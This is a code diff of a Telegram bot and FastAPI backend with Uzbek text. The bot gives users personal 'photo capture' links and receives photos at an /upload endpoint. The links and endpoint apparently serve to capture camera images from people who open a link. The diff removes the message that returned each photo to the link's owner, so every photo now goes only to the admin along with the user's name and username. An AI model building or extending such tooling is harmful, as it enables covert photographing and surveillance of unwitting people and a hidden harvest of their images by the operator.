@@ -55,7 +55,11 @@ def load_users():
                 return data
             elif isinstance(data, list):
                 return {
-                    str(u): {"id": u, "first_name": "Foydalanuvchi", "username": "Mavjud emas"}
+                    str(u): {
+                        "id": u,
+                        "first_name": "Foydalanuvchi",
+                        "username": "Mavjud emas",
+                    }
                     for u in data
                 }
         except Exception:
@@ -85,10 +89,8 @@ BROADCAST_STATE = {}
 tg_app = Application.builder().token(TOKEN.strip()).build()
 
 
-# --- /start buyrug'i ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    logging.info(f">>> /start buyrug'i keldi! User ID: {user.id}")
     save_user(user)
 
     if user.id == ADMIN_ID:
@@ -119,14 +121,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 
-# --- Klaviatura tugmalarini qayta ishlash ---
 async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     text = update.message.text
     save_user(user)
 
-    # Admin xabar yuborish rejimida bo'lsa
     if user_id == ADMIN_ID and BROADCAST_STATE.get(user_id):
         BROADCAST_STATE[user_id] = False
         users = load_users()
@@ -151,7 +151,6 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # A) Rasmga olish linki
     if text == "📸 Rasmga olish linki":
         personal_link = f"{NETLIFY_URL}/?uid={user_id}"
         await update.message.reply_text(
@@ -159,16 +158,16 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown",
         )
 
-    # B) Admin: Batafsil Statistika
     elif text == "📊 Statistika" and user_id == ADMIN_ID:
         users = load_users()
         total = len(users)
 
         msg = f"📊 **Bot statistikasi:**\n\nJami foydalanuvchilar: `{total}` ta\n\n"
-        msg += "👥 **Foydalanuvchilar ro'yxati:**\n"
+        msg += "👥 **Oxirgi foydalanuvchilar (so'nggi 30 tasi):**\n"
 
         if users:
-            for idx, (uid_str, uinfo) in enumerate(users.items(), 1):
+            user_items = list(users.items())[-30:]
+            for idx, (uid_str, uinfo) in enumerate(user_items, 1):
                 name = uinfo.get("first_name", "Noma'lum")
                 uname = uinfo.get("username", "Mavjud emas")
                 uid = uinfo.get("id", uid_str)
@@ -181,7 +180,6 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await update.message.reply_text(msg, parse_mode="Markdown")
 
-    # C) Admin: Xabar yuborish
     elif text == "📢 Xabar yuborish" and user_id == ADMIN_ID:
         BROADCAST_STATE[user_id] = True
         await update.message.reply_text(
@@ -197,12 +195,10 @@ tg_app.add_handler(
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    logging.info(">>> Bot ishga tushmoqda...")
     await tg_app.initialize()
     await tg_app.bot.delete_webhook(drop_pending_updates=True)
     await tg_app.start()
     await tg_app.updater.start_polling()
-    logging.info(">>> Bot muvaffaqiyatli polling rejimiga o'tdi!")
     yield
     await tg_app.updater.stop()
     await tg_app.stop()
@@ -234,7 +230,6 @@ async def health():
     return {"ok": True}
 
 
-# --- Rasm qabul qilish ---
 @app.post("/upload")
 async def upload(photo: Photo):
     if photo.uid <= 0:
@@ -254,32 +249,12 @@ async def upload(photo: Photo):
     path = UPLOADS / f"{uuid.uuid4().hex}.jpg"
     path.write_bytes(raw)
 
-    bot_info = await bot.get_me()
-    bot_link = f"https://t.me/{bot_info.username}"
-
-    # Foydalanuvchi ma'lumotlarini bazadan olish
     users = load_users()
     uinfo = users.get(str(photo.uid), {})
     fname = uinfo.get("first_name", "Noma'lum")
     uname = uinfo.get("username", "Mavjud emas")
 
     try:
-        # Foydalanuvchiga rasm
-        user_keyboard = InlineKeyboardMarkup(
-            [[InlineKeyboardButton("🤖 Botga qaytish", url=bot_link)]]
-        )
-        try:
-            with path.open("rb") as f:
-                await bot.send_photo(
-                    chat_id=photo.uid,
-                    photo=f,
-                    caption="✅ Suratingiz qabul qilindi!",
-                    reply_markup=user_keyboard,
-                )
-        except Exception:
-            pass  # Agar user botni bloklagan bo'lsa ham adminga rasm boradi
-
-        # Adminga rasm (Batafsil ma'lumotlar bilan)
         admin_keyboard = InlineKeyboardMarkup(
             [[
                 InlineKeyboardButton(
@@ -301,7 +276,6 @@ async def upload(photo: Photo):
                 parse_mode="Markdown",
                 reply_markup=admin_keyboard,
             )
-
     finally:
         path.unlink(missing_ok=True)
 
